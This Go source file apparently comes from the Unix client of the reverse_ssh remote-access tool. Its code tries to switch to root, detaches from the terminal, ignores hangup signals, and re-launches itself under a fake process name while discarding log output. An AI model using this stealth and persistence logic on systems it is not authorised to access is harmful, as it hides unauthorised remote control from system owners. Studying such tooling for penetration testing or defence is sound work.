//go:build !windows

package main

import (
	"io"
	"log"
	"os"
	"os/signal"
	"strconv"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func Run(settings *client.Settings) {
	//Try to elavate to root (in case we are a root:root setuid/gid binary)
	syscall.Setuid(0)
	syscall.Setgid(0)

	//Create our own process group, and ignore any  hang up signals
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE)

	// on the linux platform we cant use winauth
	client.Run(settings)
}

func Fork(settings *client.Settings, pretendArgv ...string) error {
	options := forkOptions{}
	var sysProcAttr *syscall.SysProcAttr
	if settings != nil && settings.NoHistorySave {
		options.DiscardIO = true
		sysProcAttr = &syscall.SysProcAttr{Setsid: true}
		closeExtraFileDescriptorsOnExec()
		log.SetOutput(io.Discard)
	}

	log.Println("Forking")

	err := fork("/proc/self/exe", sysProcAttr, options, pretendArgv...)
	if err != nil {
		log.Println("Forking from /proc/self/exe failed: ", err)

		binary, err := os.Executable()
		if err == nil {
			err = fork(binary, sysProcAttr, options, pretendArgv...)
		}

		log.Println("Forking from argv[0] failed: ", err)
		return err
	}
	return nil
}

func closeExtraFileDescriptorsOnExec() {
	entries, err := os.ReadDir("/proc/self/fd")
	if err != nil {
		return
	}
	for _, entry := range entries {
		fd, err := strconv.Atoi(entry.Name())
		if err != nil || fd <= 2 {
			continue
		}
		syscall.CloseOnExec(fd)
	}
}
